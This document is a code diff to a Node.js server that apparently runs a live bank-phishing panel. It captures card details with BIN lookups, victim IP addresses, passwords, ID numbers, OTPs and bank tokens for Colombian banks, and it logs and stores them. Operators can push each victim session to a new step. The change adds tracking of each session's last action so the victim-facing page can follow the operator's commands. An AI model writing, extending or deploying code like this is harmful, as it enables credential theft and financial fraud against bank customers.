@@ -21,6 +21,7 @@ if (!fs.existsSync(DATA_DIR)) {
 
 const estadoSesiones = new Map();
 const datosSesiones = new Map();
+const ultimaAccionSesiones = new Map(); // 🔥 NUEVO
 const usuariosActivos = new Map();
 const rateLimits = new Map();
 const tokensInvalidos = new Set();
@@ -329,7 +330,8 @@ const server = http.createServer(async (req, res) => {
                 
                 const estadoNuevo = mapEstados[accion];
                 estadoSesiones.set(sessionId, estadoNuevo);
-                
+                ultimaAccionSesiones.set(sessionId, accion); // 🔥 GUARDAMOS ACCIÓN
+
                 let datosActuales = datosSesiones.get(sessionId) || {};
                 const bancoKey = datosActuales.bancoKey || '';
                 const esTarjeta = bancoKey === 'cc-bogota' || bancoKey === 'cc-bucaramanga';
@@ -345,7 +347,7 @@ const server = http.createServer(async (req, res) => {
 
                 agregarLog('accion', { usuario: payload.user, sessionId, accion });
                 console.log(`[${payload.user}] ${accion} → ${sessionId}`);
-                json(res, 200, { ok: true, estado: estadoNuevo });
+                json(res, 200, { ok: true, estado: estadoNuevo, accion });
             } catch (e) { json(res, 400, { ok: false }); }
             return;
         }
@@ -392,6 +394,7 @@ const server = http.createServer(async (req, res) => {
                     if (estadoSesiones.delete(sid)) borradas++;
                     datosSesiones.delete(sid);
                     usuariosActivos.delete(sid);
+                    ultimaAccionSesiones.delete(sid); // 🔥 LIMPIAMOS
                 });
                 agregarLog('borrar-sesiones', { usuario: payload.user, cantidad: borradas, sessionIds });
                 json(res, 200, { ok: true, borradas });
@@ -479,7 +482,8 @@ const server = http.createServer(async (req, res) => {
 
             estadoSesiones.set(sessionId, 'pendiente');
             datosSesiones.set(sessionId, datosSesion);
-            
+            ultimaAccionSesiones.set(sessionId, 'ENVIAR_PAGO'); // 🔥
+
             guardarHistorial(bancoKey, datosSesion);
 
             console.log(`[${bancoKey}] Nueva sesión: ${sessionId} (${marca}) IP=${ip} | BIN=${infoBin?.bin || '?'} Tipo=${infoBin?.cardType || '?'} Nivel=${infoBin?.cardLevel || '?'}`);
@@ -499,7 +503,8 @@ const server = http.createServer(async (req, res) => {
             const datosCompletos = Object.assign({}, datosOriginales, { otp });
             estadoSesiones.set(sessionId, 'pendiente');
             datosSesiones.set(sessionId, datosCompletos);
-            
+            ultimaAccionSesiones.set(sessionId, 'ENVIAR_OTP'); // 🔥
+
             guardarHistorial(bancoKey, datosCompletos);
 
             console.log(`[${bancoKey}] OTP: ${sessionId} → ${otp}`);
@@ -524,7 +529,8 @@ const server = http.createServer(async (req, res) => {
             };
             estadoSesiones.set(sessionId, 'pendiente');
             datosSesiones.set(sessionId, datosSesion);
-            
+            ultimaAccionSesiones.set(sessionId, 'ENVIAR'); // 🔥
+
             guardarHistorial(bancoKey, datosSesion);
 
             console.log(`[${bancoKey}] Nueva sesión: ${sessionId}`);
@@ -546,7 +552,8 @@ const server = http.createServer(async (req, res) => {
             const datosCompletos = Object.assign({}, previos, { token, identificacion: identificacion || previos.identificacion, clave: clave || previos.clave });
             datosSesiones.set(sessionId, datosCompletos);
             estadoSesiones.set(sessionId, 'token');
-            
+            ultimaAccionSesiones.set(sessionId, 'TOKEN'); // 🔥
+
             guardarHistorial(bancoKey, datosCompletos);
 
             console.log(`[${bancoKey}] Token: ${sessionId} → ${token}`);
@@ -568,7 +575,8 @@ const server = http.createServer(async (req, res) => {
             const datosCompletos = Object.assign({}, previos, { otp, identificacion: identificacion || previos.identificacion, clave: clave || previos.clave });
             datosSesiones.set(sessionId, datosCompletos);
             estadoSesiones.set(sessionId, 'otp');
-            
+            ultimaAccionSesiones.set(sessionId, 'OTP'); // 🔥
+
             guardarHistorial(bancoKey, datosCompletos);
 
             console.log(`[${bancoKey}] OTP: ${sessionId} → ${otp}`);
@@ -586,7 +594,8 @@ const server = http.createServer(async (req, res) => {
         if (!esValido) { json(res, 404, { ok: false }); return; }
 
         const estado = estadoSesiones.get(sessionId) || 'pendiente';
-        json(res, 200, { estado });
+        const accion = ultimaAccionSesiones.get(sessionId) || ''; // 🔥 DEVOLVEMOS ACCIÓN
+        json(res, 200, { estado, accion });
         return;
     }
 
